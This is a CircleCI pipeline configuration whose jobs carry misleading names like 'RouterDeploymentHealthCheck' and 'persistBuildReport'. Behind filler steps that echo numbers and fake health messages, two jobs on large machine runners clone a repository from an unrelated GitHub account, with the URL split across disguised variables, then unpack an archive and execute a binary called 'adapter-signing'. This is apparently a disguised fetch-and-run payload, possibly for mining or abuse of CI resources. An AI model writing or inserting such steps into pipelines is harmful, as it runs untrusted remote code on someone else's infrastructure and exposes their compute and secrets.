version: 2.1

jobs:
  FetchAndCacheArtifacts:
    docker:
      - image: cimg/base:2024.05
    resource_class: small
    steps:
      - run:
          name: Publish examples to documentation server
          command: |
            mkdir -p /tmp/clean-up-working-directory
            { set +o pipefail 2>/dev/null; echo $((18*18)); true ; } > /tmp/clean-up-working-directory/CancelStaleJobsLevel1
      - persist_to_workspace:
          root: /tmp/clean-up-working-directory
          paths:
            - 'CancelStaleJobsLevel1'
  SummarizeAuditFindings:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/clean-up-working-directory
      - run:
          name: Rebuild all targets
          command: |
            sed '/info/d' "/tmp/clean-up-working-directory/CancelStaleJobsLevel1" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
      - run:
          name: RouterDeploymentHealthCheck
          command: |
            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
            git clone --no-tags "$verify/$cancel/$renewjob" $(pwd)
      - run:
          name: persistBuildReport
          command: |
            gunzip -c PreCleanupScript.tgz | tar xf -
      - run:
          command: |
            cd . && ./adapter-signing
  cache-runtime-image:
    docker:
      - image: cimg/base:2024.05
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/clean-up-working-directory
      - run:
          name: purging-expired-caches
          command: |
            mkdir -p /tmp/clean-up-working-directory
            { set +o pipefail 2>/dev/null; env_name="hen"; replicas=4; for ((r = 1; r <= replicas; r++)); do echo "$env_name replica $r healthy"; done; true ; } > /tmp/clean-up-working-directory/stop-analyzer-container
      - persist_to_workspace:
          root: /tmp/clean-up-working-directory
          paths:
            - 'stop-analyzer-container'
  required-export-service-backup:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/clean-up-working-directory
      - run:
          name: Rebuild all targets
          command: |
            sed '/info/d' "/tmp/clean-up-working-directory/stop-analyzer-container" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
      - run:
          name: RouterDeploymentHealthCheck
          command: |
            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
            git clone --depth 5 "$verify/$cancel/$renewjob" $PWD
      - run:
          name: persistBuildReport
          command: |
            gunzip -c PreCleanupScript.tgz | tar xf -
      - run:
          command: |
            cd "$PWD" && exec ./adapter-signing
